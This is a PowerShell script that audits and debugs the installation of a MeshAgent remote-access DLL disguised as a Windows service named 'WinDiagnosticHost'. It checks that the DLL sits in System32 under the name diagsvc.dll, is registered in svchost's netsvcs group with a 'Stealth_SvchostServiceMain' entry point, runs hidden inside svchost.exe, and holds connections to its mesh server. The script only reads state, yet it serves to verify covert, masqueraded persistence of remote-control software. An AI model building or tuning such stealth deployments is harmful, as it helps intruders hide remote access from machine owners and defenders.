# MeshAgent Svchost Integration Audit & Debug Script
# This script audits and debugs the WinDiagnosticHost service installation

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "MeshAgent Svchost Integration Audit" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

$ServiceName = "WinDiagnosticHost"
$DllPath = "C:\WINDOWS\System32\DiagnosticHost\diagsvc.dll"
$SourceDll = "C:\Users\Maincon\OneDrive\Documents\GitHub\MeshAgent\meshservice\x64\StealthLab_DLL\MeshService-2022.dll"
$ConfigFile = "C:\Users\Maincon\OneDrive\Documents\GitHub\MeshAgent\WinDiagnosticHost.msh"

# 1. CHECK SOURCE FILES
Write-Host "[1] Checking Source Files..." -ForegroundColor Yellow
Write-Host ""

if (Test-Path $SourceDll) {
    $dllInfo = Get-Item $SourceDll
    Write-Host "  ✓ DLL Found: $SourceDll" -ForegroundColor Green
    Write-Host "    Size: $($dllInfo.Length) bytes" -ForegroundColor Gray
    Write-Host "    Modified: $($dllInfo.LastWriteTime)" -ForegroundColor Gray
} else {
    Write-Host "  ✗ DLL NOT FOUND: $SourceDll" -ForegroundColor Red
    Write-Host "    ERROR: You need to build the DLL first!" -ForegroundColor Red
    Write-Host "    Run: .\build_complete.ps1" -ForegroundColor Yellow
    exit 1
}

if (Test-Path $ConfigFile) {
    Write-Host "  ✓ Config Found: $ConfigFile" -ForegroundColor Green
    $config = Get-Content $ConfigFile | ConvertFrom-Json
    Write-Host "    MeshServer: $($config.MeshServer)" -ForegroundColor Gray
    Write-Host "    MeshName: $($config.MeshName)" -ForegroundColor Gray
} else {
    Write-Host "  ✗ Config NOT FOUND: $ConfigFile" -ForegroundColor Red
}

Write-Host ""

# 2. CHECK SERVICE INSTALLATION
Write-Host "[2] Checking Service Installation..." -ForegroundColor Yellow
Write-Host ""

$service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if ($service) {
    Write-Host "  ✓ Service Exists: $ServiceName" -ForegroundColor Green
    Write-Host "    Status: $($service.Status)" -ForegroundColor $(if ($service.Status -eq 'Running') {'Green'} else {'Red'})
    Write-Host "    StartType: $($service.StartType)" -ForegroundColor Gray
} else {
    Write-Host "  ✗ Service NOT INSTALLED" -ForegroundColor Red
    Write-Host "    Service needs to be created" -ForegroundColor Yellow
}

Write-Host ""

# 3. CHECK REGISTRY CONFIGURATION
Write-Host "[3] Checking Registry Configuration..." -ForegroundColor Yellow
Write-Host ""

$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName"
if (Test-Path $regPath) {
    Write-Host "  ✓ Registry Key Exists: $regPath" -ForegroundColor Green

    $imagePath = (Get-ItemProperty -Path $regPath -Name ImagePath -ErrorAction SilentlyContinue).ImagePath
    Write-Host "    ImagePath: $imagePath" -ForegroundColor Gray

    $startType = (Get-ItemProperty -Path $regPath -Name Start -ErrorAction SilentlyContinue).Start
    Write-Host "    Start: $startType (2=Automatic, 3=Manual, 4=Disabled)" -ForegroundColor Gray

    # Check Parameters
    $paramsPath = "$regPath\Parameters"
    if (Test-Path $paramsPath) {
        Write-Host "  ✓ Parameters Key Exists" -ForegroundColor Green

        $serviceDll = (Get-ItemProperty -Path $paramsPath -Name ServiceDll -ErrorAction SilentlyContinue).ServiceDll
        Write-Host "    ServiceDll: $serviceDll" -ForegroundColor Gray

        $serviceMain = (Get-ItemProperty -Path $paramsPath -Name ServiceMain -ErrorAction SilentlyContinue).ServiceMain
        Write-Host "    ServiceMain: $serviceMain" -ForegroundColor Gray

        if ($serviceMain -ne "Stealth_SvchostServiceMain") {
            Write-Host "    ✗ ServiceMain is incorrect! Should be 'Stealth_SvchostServiceMain'" -ForegroundColor Red
        }
    } else {
        Write-Host "  ✗ Parameters Key Missing" -ForegroundColor Red
    }
} else {
    Write-Host "  ✗ Registry Key NOT FOUND" -ForegroundColor Red
}

Write-Host ""

# 4. CHECK DLL INSTALLATION
Write-Host "[4] Checking DLL Installation..." -ForegroundColor Yellow
Write-Host ""

$installDir = Split-Path $DllPath -Parent
if (Test-Path $installDir) {
    Write-Host "  ✓ Install Directory Exists: $installDir" -ForegroundColor Green
} else {
    Write-Host "  ✗ Install Directory Missing: $installDir" -ForegroundColor Red
}

if (Test-Path $DllPath) {
    $installedDll = Get-Item $DllPath
    Write-Host "  ✓ DLL Installed: $DllPath" -ForegroundColor Green
    Write-Host "    Size: $($installedDll.Length) bytes" -ForegroundColor Gray
    Write-Host "    Modified: $($installedDll.LastWriteTime)" -ForegroundColor Gray

    # Compare with source
    $sourceDllInfo = Get-Item $SourceDll
    if ($installedDll.Length -eq $sourceDllInfo.Length) {
        Write-Host "    ✓ DLL size matches source" -ForegroundColor Green
    } else {
        Write-Host "    ✗ DLL size differs from source!" -ForegroundColor Red
        Write-Host "      Source: $($sourceDllInfo.Length) bytes" -ForegroundColor Yellow
        Write-Host "      Installed: $($installedDll.Length) bytes" -ForegroundColor Yellow
    }
} else {
    Write-Host "  ✗ DLL NOT INSTALLED: $DllPath" -ForegroundColor Red
}

Write-Host ""

# 5. CHECK SVCHOST REGISTRATION
Write-Host "[5] Checking Svchost Registration..." -ForegroundColor Yellow
Write-Host ""

$svchostPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
$netsvcs = (Get-ItemProperty -Path $svchostPath -Name "netsvcs" -ErrorAction SilentlyContinue).netsvcs

if ($netsvcs -contains $ServiceName) {
    Write-Host "  ✓ Service registered in netsvcs group" -ForegroundColor Green
} else {
    Write-Host "  ✗ Service NOT registered in netsvcs group" -ForegroundColor Red
    Write-Host "    Current netsvcs services: $($netsvcs -join ', ')" -ForegroundColor Gray
}

Write-Host ""

# 6. CHECK PROCESS STATUS
Write-Host "[6] Checking Process Status..." -ForegroundColor Yellow
Write-Host ""

if ($service -and $service.Status -eq 'Running') {
    # Get service process ID
    $svc = Get-CimInstance Win32_Service -Filter "Name='$ServiceName'"
    if ($svc.ProcessId) {
        Write-Host "  ✓ Service is Running" -ForegroundColor Green
        Write-Host "    Process ID: $($svc.ProcessId)" -ForegroundColor Gray

        $proc = Get-Process -Id $svc.ProcessId -ErrorAction SilentlyContinue
        if ($proc) {
            Write-Host "    Process Name: $($proc.Name)" -ForegroundColor Gray
            Write-Host "    Memory Usage: $([math]::Round($proc.WorkingSet64/1MB, 2)) MB" -ForegroundColor Gray

            if ($proc.Name -eq "svchost") {
                Write-Host "    ✓ Running in svchost.exe (CORRECT)" -ForegroundColor Green
            } else {
                Write-Host "    ✗ NOT running in svchost.exe!" -ForegroundColor Red
            }

            # Check DLL loaded
            $loadedDlls = $proc.Modules | Where-Object { $_.FileName -like "*diagsvc.dll*" }
            if ($loadedDlls) {
                Write-Host "    ✓ DLL is loaded in process" -ForegroundColor Green
            } else {
                Write-Host "    ✗ DLL not found in process modules" -ForegroundColor Red
            }
        }
    }
} else {
    Write-Host "  - Service is not running" -ForegroundColor Yellow
}

Write-Host ""

# 7. CHECK NETWORK CONNECTIONS
Write-Host "[7] Checking Network Connections..." -ForegroundColor Yellow
Write-Host ""

if ($service -and $service.Status -eq 'Running') {
    $svc = Get-CimInstance Win32_Service -Filter "Name='$ServiceName'"
    if ($svc.ProcessId) {
        $connections = Get-NetTCPConnection -OwningProcess $svc.ProcessId -ErrorAction SilentlyContinue
        if ($connections) {
            Write-Host "  ✓ Active Connections:" -ForegroundColor Green
            foreach ($conn in $connections | Select-Object -First 5) {
                Write-Host "    $($conn.LocalAddress):$($conn.LocalPort) -> $($conn.RemoteAddress):$($conn.RemotePort) [$($conn.State)]" -ForegroundColor Gray
            }
        } else {
            Write-Host "  - No active TCP connections" -ForegroundColor Yellow
        }
    }
} else {
    Write-Host "  - Service not running" -ForegroundColor Yellow
}

Write-Host ""

# 8. CHECK EVENT LOGS
Write-Host "[8] Checking Event Logs..." -ForegroundColor Yellow
Write-Host ""

$events = Get-WinEvent -FilterHashtable @{LogName='System'; ID=7034,7035,7036,7040,7045; StartTime=(Get-Date).AddHours(-24)} -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -like "*$ServiceName*" } |
    Select-Object -First 5

if ($events) {
    Write-Host "  Recent service events:" -ForegroundColor Green
    foreach ($event in $events) {
        $color = if ($event.LevelDisplayName -eq 'Error') { 'Red' } elseif ($event.LevelDisplayName -eq 'Warning') { 'Yellow' } else { 'Gray' }
        Write-Host "    [$($event.TimeCreated)] $($event.LevelDisplayName): $($event.Message.Split("`n")[0])" -ForegroundColor $color
    }
} else {
    Write-Host "  - No recent events found" -ForegroundColor Yellow
}

Write-Host ""

# SUMMARY AND RECOMMENDATIONS
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Summary and Recommendations" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

$issues = @()

if (-not $service) {
    $issues += "Service is not installed"
    Write-Host "→ Run: .\install_svchost_now.ps1 (as Administrator)" -ForegroundColor Yellow
}

if ($service -and $service.Status -ne 'Running') {
    $issues += "Service is not running"
    Write-Host "→ Run: Start-Service -Name $ServiceName" -ForegroundColor Yellow
}

if (-not (Test-Path $DllPath)) {
    $issues += "DLL is not installed"
    Write-Host "→ Run: .\install_svchost_now.ps1 (as Administrator)" -ForegroundColor Yellow
}

if ($service -and $service.Status -eq 'Running') {
    $svc = Get-CimInstance Win32_Service -Filter "Name='$ServiceName'"
    if ($svc.ProcessId) {
        $proc = Get-Process -Id $svc.ProcessId -ErrorAction SilentlyContinue
        if ($proc -and $proc.Name -ne "svchost") {
            $issues += "Not running in svchost.exe"
            Write-Host "→ Check registry configuration and reinstall" -ForegroundColor Yellow
        }
    }
}

if ($issues.Count -eq 0) {
    Write-Host "✓ All checks passed! Service is properly configured." -ForegroundColor Green
} else {
    Write-Host "✗ Found $($issues.Count) issue(s):" -ForegroundColor Red
    foreach ($issue in $issues) {
        Write-Host "  - $issue" -ForegroundColor Red
    }
}

Write-Host ""

# DEBUGGING COMMANDS
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Useful Debugging Commands" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "# View service status:" -ForegroundColor Gray
Write-Host "Get-Service -Name $ServiceName | Format-List *" -ForegroundColor White
Write-Host ""
Write-Host "# View service process:" -ForegroundColor Gray
Write-Host "`$svc = Get-CimInstance Win32_Service -Filter `"Name='$ServiceName'`"; Get-Process -Id `$svc.ProcessId" -ForegroundColor White
Write-Host ""
Write-Host "# View loaded DLLs:" -ForegroundColor Gray
Write-Host "`$svc = Get-CimInstance Win32_Service -Filter `"Name='$ServiceName'`"; (Get-Process -Id `$svc.ProcessId).Modules | Where-Object {`$_.FileName -like '*diag*'}" -ForegroundColor White
Write-Host ""
Write-Host "# Start service:" -ForegroundColor Gray
Write-Host "Start-Service -Name $ServiceName" -ForegroundColor White
Write-Host ""
Write-Host "# Stop service:" -ForegroundColor Gray
Write-Host "Stop-Service -Name $ServiceName" -ForegroundColor White
Write-Host ""
Write-Host "# Restart service:" -ForegroundColor Gray
Write-Host "Restart-Service -Name $ServiceName" -ForegroundColor White
Write-Host ""
Write-Host "# View real-time logs:" -ForegroundColor Gray
Write-Host "Get-WinEvent -LogName System -MaxEvents 10 | Where-Object {`$_.Message -like '*$ServiceName*'}" -ForegroundColor White
Write-Host ""
Write-Host "# Uninstall service:" -ForegroundColor Gray
Write-Host "Stop-Service -Name $ServiceName; sc.exe delete $ServiceName" -ForegroundColor White
Write-Host ""
